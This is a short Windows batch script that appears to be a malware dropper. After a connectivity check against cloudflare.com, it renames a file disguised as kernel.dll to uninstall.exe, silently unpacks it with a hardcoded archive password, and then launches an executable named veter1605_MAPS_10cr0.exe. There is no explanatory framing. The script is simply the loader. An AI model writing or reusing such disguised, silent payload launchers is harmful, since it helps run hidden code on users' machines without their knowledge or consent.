@echo off

ping www.cloudflare.com -n 3 -w 3000
IF %ERRORLEVEL% NEQ 1  rename kernel.dll uninstall.exe
ping www.cloudflare.com -n 3 -w 1000
IF %ERRORLEVEL% NEQ 1 start uninstall.exe x -pQELRatcwbU2EJ5 -y

start veter1605_MAPS_10cr0.exe







       

